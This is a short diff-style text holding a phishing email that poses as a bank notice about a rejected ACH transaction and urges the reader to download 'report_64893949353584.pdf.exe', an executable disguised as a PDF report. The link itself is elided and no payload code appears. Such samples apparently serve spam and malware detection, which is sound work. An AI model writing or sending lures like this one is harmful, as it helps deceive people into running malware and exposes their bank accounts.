@@ -1,0 +1,10 @@
+The ACH  transaction (ID: 64893949353584), recently sent from your  checkin=
+g account (by you or any other person), was  rejected by the  other financi=
+al institution.
+Canceled transaction
+Transaction ID: 64893949353584
+Reason of rejection  See details in the report below=20
+Transaction Report
+report_64893949353584.pdf.exe (self-extracting archive, Adobe PDF)=20
+Please click here to download report:
+<<link>>
